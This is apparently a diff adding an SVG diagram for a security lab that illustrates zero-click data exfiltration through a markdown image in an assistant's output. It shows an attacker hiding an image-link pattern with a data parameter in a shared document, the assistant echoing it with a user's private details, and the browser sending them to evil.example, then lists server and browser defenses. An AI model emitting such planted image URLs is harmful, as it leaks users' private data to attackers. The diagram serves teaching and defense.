@@ -1,0 +1,57 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="600" viewBox="0 0 1200 600" font-family="Segoe UI, Helvetica, Arial, sans-serif">
+  <title>Zero-click data exfiltration through a markdown image in model output</title>
+  <defs>
+    <marker id="a" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#334155"/></marker>
+    <marker id="r" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#dc2626"/></marker>
+  </defs>
+  <rect width="1200" height="600" fill="#ffffff"/>
+  <text x="40" y="50" font-size="28" font-weight="700" fill="#0f172a">Zero-click exfiltration with a markdown image</text>
+  <text x="40" y="80" font-size="16" fill="#475569">The victim only asks for a summary. The browser does the rest by loading an "image" whose URL carries her data.</text>
+
+  <!-- lane headers: centers 140, 380, 620, 860, 1080 -->
+  <rect x="50" y="100" width="180" height="46" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="140" y="129" text-anchor="middle" font-size="15" font-weight="700" fill="#991b1b">Attacker</text>
+  <rect x="290" y="100" width="180" height="46" rx="10" fill="#f8fafc" stroke="#64748b" stroke-width="2"/>
+  <text x="380" y="129" text-anchor="middle" font-size="15" font-weight="700" fill="#334155">Shared document</text>
+  <rect x="530" y="100" width="180" height="46" rx="10" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
+  <text x="620" y="129" text-anchor="middle" font-size="15" font-weight="700" fill="#1e3a8a">Assistant (LLM)</text>
+  <rect x="770" y="100" width="180" height="46" rx="10" fill="#fffbeb" stroke="#d97706" stroke-width="2"/>
+  <text x="860" y="129" text-anchor="middle" font-size="15" font-weight="700" fill="#92400e">Alice's browser</text>
+  <rect x="1000" y="100" width="160" height="46" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+  <text x="1080" y="129" text-anchor="middle" font-size="15" font-weight="700" fill="#991b1b">evil.example</text>
+
+  <g stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6">
+    <line x1="140" y1="146" x2="140" y2="470"/>
+    <line x1="380" y1="146" x2="380" y2="470"/>
+    <line x1="620" y1="146" x2="620" y2="470"/>
+    <line x1="860" y1="146" x2="860" y2="470"/>
+    <line x1="1080" y1="146" x2="1080" y2="470"/>
+  </g>
+
+  <!-- 1 -->
+  <path d="M140 190 L374 190" stroke="#dc2626" stroke-width="2.5" marker-end="url(#r)"/>
+  <text x="150" y="182" font-size="13" fill="#991b1b">1. hides "![](…?d={DATA})"</text>
+  <!-- 2 -->
+  <path d="M860 240 L626 240" stroke="#334155" stroke-width="2.5" marker-end="url(#a)"/>
+  <text x="636" y="232" font-size="13" fill="#0f172a">2. Alice: "summarize this doc"</text>
+  <!-- 3 -->
+  <path d="M380 290 L614 290" stroke="#334155" stroke-width="2.5" marker-end="url(#a)"/>
+  <text x="390" y="282" font-size="13" fill="#0f172a">3. doc enters context</text>
+  <text x="390" y="308" font-size="12" fill="#475569">next to Alice's private notes</text>
+  <!-- 4 -->
+  <path d="M620 350 L854 350" stroke="#dc2626" stroke-width="2.5" marker-end="url(#r)"/>
+  <text x="630" y="342" font-size="13" fill="#991b1b">4. answer + markdown image</text>
+  <text x="630" y="368" font-size="12" fill="#991b1b">b.png?d=ACCT-…,alice@…</text>
+  <!-- 5 -->
+  <path d="M860 410 L1074 410" stroke="#dc2626" stroke-width="2.5" marker-end="url(#r)"/>
+  <text x="870" y="402" font-size="13" fill="#991b1b">5. auto GET (no click)</text>
+  <!-- 6 -->
+  <rect x="1000" y="430" width="160" height="40" rx="8" fill="#fef2f2" stroke="#dc2626" stroke-width="1.5"/>
+  <text x="1080" y="455" text-anchor="middle" font-size="12" font-weight="700" fill="#991b1b">6. data in access log</text>
+
+  <!-- fixes -->
+  <rect x="40" y="492" width="1120" height="90" rx="10" fill="#f0fdf4" stroke="#16a34a" stroke-width="2"/>
+  <text x="60" y="520" font-size="16" font-weight="700" fill="#166534">Break the chain at step 4 or 5 (hard controls)</text>
+  <text x="60" y="545" font-size="14" fill="#166534">• Server: remove images and links to hosts not on the allowlist before the answer leaves (lab layer D4).</text>
+  <text x="60" y="567" font-size="14" fill="#166534">• Browser: Content-Security-Policy img-src allowlist, or proxy images server-side. • Context: fewer secrets to steal.</text>
+</svg>
